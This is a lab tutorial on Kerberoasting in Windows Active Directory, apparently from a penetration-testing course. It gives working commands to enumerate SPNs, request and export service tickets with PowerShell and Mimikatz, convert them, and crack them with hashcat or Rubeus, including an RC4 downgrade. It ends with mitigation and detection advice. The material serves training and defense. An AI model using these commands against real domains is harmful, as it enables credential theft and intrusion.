
# Kerberoasting - Semi Manual Method

Before tools such as Rubeus existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactics and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in `setspn` binary to enumerate SPNs in the domain.

---

## Enumerating SPNs with `setspn.exe`

```cmd
C:\htb> setspn.exe -Q */*


Checking domain DC=INLANEFREIGHT,DC=LOCAL  
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL  
    exchangeAB/ACADEMY-EA-DC01  
    exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL  
    TERMSRV/ACADEMY-EA-DC01  
    TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL  
    Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL  
    ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL  
    ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL

<SNIP>

CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  
    backupjob/veam001.inlanefreight.local  
CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  
    sts/inlanefreight.local

<SNIP>

CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  
    MSSQLSvc/SPSJDB.inlanefreight.local:1433  
CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  
    MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  
    MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  
CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  
    adfsconnect/azure01.inlanefreight.local
```

**Existing SPNs found!**

Many different SPNs are returned for various hosts. Focus on user accounts and ignore computer accounts. Next, using PowerShell, we can request TGS tickets for an account and load them into memory. Once loaded, we can extract them with Mimikatz. Let's target a single user:

---

## Targeting a Single User


```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```


This creates a Kerberos ticket for the specified SPN.

### Breakdown of commands:

- `Add-Type` adds a .NET class to PowerShell.
- `-AssemblyName` specifies the assembly containing the class.
- `System.IdentityModel` namespace contains classes for security tokens.
- `New-Object` instantiates the `KerberosRequestorSecurityToken` class, requesting a TGS for the SPN.

---

## Retrieving All Tickets Using `setspn.exe`

```powershell
powershell

PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { 
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() 
}
```

This loads all tickets into memory, ready for extraction with Mimikatz.

---

## Extracting Tickets from Memory with Mimikatz

```powershell
powershell

# Use mimikatz to list tickets and export them
mimikatz # kerberos::list /export
```

- The tickets are exported as base64-encoded `.kirbi` files.
- These can be decoded and converted for cracking.

### Example of decoding and preparing for cracking:

```bash
bash

cat encoded_file | base64 -d > sqldev.kirbi
```

- Use `kirbi2john.py` to extract hash:

```bash
bash

python2.7 kirbi2john.py sqldev.kirbi
```

- Modify the hash for Hashcat:

```bash
bash

sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

- Verify the hash:

```bash
bash

cat sqldev_tgs_hashcat
```

- Crack with Hashcat:

```bash
bash

hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

---

## Offline Cracking Example

When the hash is cracked, it reveals the password. For example, a weak password might be cracked in seconds on a CPU, and almost instantly on a GPU.

---

## Faster Methods with Rubeus

Rubeus offers rapid Kerberoasting options, including:

```powershell
powershell

.\Rubeus.exe kerberoast /user:testspn /nowrap
```

Other options include exporting hashes, requesting tickets with specific encryption types, or targeting high-value accounts.

### Example: Gathering stats

```powershell
powershell

.\Rubeus.exe kerberoast /stats
```

### Downgrade to RC4 encryption

```powershell
powershell

.\Rubeus.exe kerberoast /tgtdeleg /nowrap
```

_Note:_ This method does not work against Windows Server 2019 Domain Controllers, which always return the highest supported encryption.

---

## Mitigation & Detection

- Use complex, long passwords or passphrases.
- Use Managed Service Accounts (MSA, gMSA) with automatic rotation.
- Monitor Kerberos TGS requests (Event IDs 4769 and 4770).
- Limit or restrict RC4 usage.
- Avoid using privileged accounts as SPNs.